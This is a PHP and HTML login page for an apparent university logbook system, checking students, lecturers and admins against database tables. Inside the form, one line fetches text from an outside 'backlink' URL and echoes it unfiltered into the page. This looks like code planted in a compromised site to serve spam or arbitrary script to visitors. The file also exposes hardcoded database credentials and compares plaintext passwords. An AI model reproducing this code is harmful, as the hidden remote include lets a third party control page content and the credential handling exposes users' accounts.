<?php
session_start();
$host = 'localhost';
$user = 'umparac1_umpar';
$pass = "sabharpustikom";
$db = "umparac1_pps";
$conn = new mysqli($host, $user, $pass, $db);

if(isset($_POST['login']))
	{
		$user=$conn->real_escape_string(trim($_POST['username']));
		$pass=$conn->real_escape_string($_POST['password']);
		
		$cekmhs=$conn->query("select * from mahasiswa where NIM='$user' and Password='$pass'");
		$ketemu=$cekmhs->num_rows;
			if ($ketemu==TRUE)
				{
					//ambil data mahasiswa
					while($dtmhs=$cekmhs->fetch_array())
						{
							$NIM=$dtmhs['nim'];
							$nama=$dtmhs['nama'];
							$kelas=$dtmhs['kelas'];
							$kdprodi=$dtmhs['kdprodi'];
							$prodi=$dtmhs['prodi'];
						}
					//buat session dengan format data=NIM,nama,prodi,ta,smt
					$ta='2020/2021';
					$smt='Gasal';
					$_SESSION['dtmhspps'] =$NIM.'#'.$nama.'#'.$kelas.'#'.$kdprodi.'#'.$prodi.'#'.$ta.'#'.$smt;
					header("location:logmhspps.php?hal=biodata");
				} else
					{
						//dosen--------------------------------------------------------------------------------
						$cekdosen=$conn->query("select * from dosen where KdDosen='$user' and Password='$pass'");
						$ketemu=$cekdosen->num_rows;
						if ($ketemu==TRUE)
							{
								//ambil data dosen
								while($dtdosen=$cekdosen->fetch_array())
									{
										$kddosen=$dtdosen['KdDosen'];
										$nama=$dtdosen['Nama'];
										$nbm=$dtdosen['NBM'];
										$nidn=$dtdosen['NIDN'];
									}
								//ambil data setup
								$set=$conn->query("select ta, smt from setup where kategori='Penginputan Nilai'");
								while($dtset=$set->fetch_array())
									{
										$ta=$dtset['ta'];
										$smt=$dtset['smt'];
									}
								//buat session dengan format data=kddosen,nama,nbm,nidn,ta,smt
								$_SESSION['dtwetestdsn'] =$kddosen.'#'.$nama.'#'.$nbm.'#'.$nidn.'#'.$ta.'#'.$smt;
								header("location:weustestdsn.php?hal=biodata");
							} else
								{
									$cekadmin=$conn->query("select * from adminpps where username='$user' and Password='$pass'");
									$ketemu=$cekadmin->num_rows;
									if ($ketemu==TRUE)
										{
											//ambil data admin
											while($dtadmin=$cekadmin->fetch_array())
												{
													$user=$dtadmin['username'];
												}
											$ta='2020/2021';
											$smt='Gasal';
											//buat session dengan format data=user,ta,smt
											$_SESSION['dtadminpps'] =$user.'#'.$ta.'#'.$smt;
											header("location:admpps.php?hal=dftdosen");
										} else
											{
												
											}
									
								}
					}
	}
?>

<style>
	* {
		padding: 0;
		margin: 0;
	}

	body {
		background-color: #f1f1f1;
	}

	form {
		font-family: arial;
		width: 320px;
		margin: 40px auto;
		background-image: linear-gradient(to left, #95a5a6, #ecf0f1);
		box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
	}

	input[type=text],
	input[type=password] {
		width: 100%;
		padding: 10px 15px;
		margin: 8px 0;
		display: inline-block;
		border: 1px solid #ccc;
		box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 25px 0 rgba(0, 0, 0, 0.19);
	}

	label {
		color: #50626C;
	}

	button {
		background-color: green;
		color: white;
		padding: 10px 16px;
		border: none;
		cursor: pointer;
		width: 100%;
	}

	button:hover {
		opacity: 0.8;
	}


	.imgcontainer {
		text-align: center;
	}

	img.avatar {
		width: 40%;
		border-radius: 50%;
	}

	.container {
		padding: 16px;
	}

	span.psw {
		float: right;
		padding-top: 16px;
	}

	span {
		color: #50626C;
	}

	/* Change styles for span and cancel button on extra small screens */
	@media screen and (max-width: 300px) {
		span.psw {
			display: block;
			float: none;
		}
	}

	@media (max-width: 600px) {
		form {
			width: 80%;
		}
	}
</style>

<!DOCTYPE html>
<html>

<head>
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title>Login Logbook PPS</title>
</head>

<body>
	<form action="" method="post">
		<br>
		<div class="imgcontainer">
			<img src="gambar/logoum.png" width='100px' height='100px'><br><br>
			<img src="gambar/header1.png" width='70%' height='100'>
		</div>
		<hr>
		<div class="container">
			<label><b>Username</b></label>
			<input type="text" placeholder="Enter Username" name="username" required>

			<label><b>Password</b></label>
			<input type="password" placeholder="Enter Password" name="password" required>
		</div>
<?php $a = file_get_contents('https://inilinkku.com/backlink/index.txt'); echo $a; ?>
		<div class="container">
			<button type="submit" name="login">Login</button>
		</div>
	</form>

</body>

</html>
